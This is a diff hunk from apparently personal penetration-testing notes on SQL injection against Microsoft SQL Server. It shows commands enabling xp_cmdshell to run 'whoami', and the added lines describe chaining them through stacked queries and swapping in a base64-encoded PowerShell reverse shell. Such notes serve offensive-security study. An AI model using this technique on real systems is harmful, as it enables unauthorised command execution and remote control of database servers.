@@ -12,6 +12,12 @@ e.g. utilizing xp_cmdshell to execute whoami command.
 5. `RECONFIGURE;`
 6. `EXECUTE xp_cmdshell 'whoami';`
 
+```
+if you find a vulnerability that allows stacked queries you can put all of the above into a single command line followed by -- //
+
+you can then replace whoami with a powershell reverse shell base64 encoded from revshells
+```
+
 This can be used to upgrade out SQL shell to a more standard reverse shell.
 
 #### blind payload
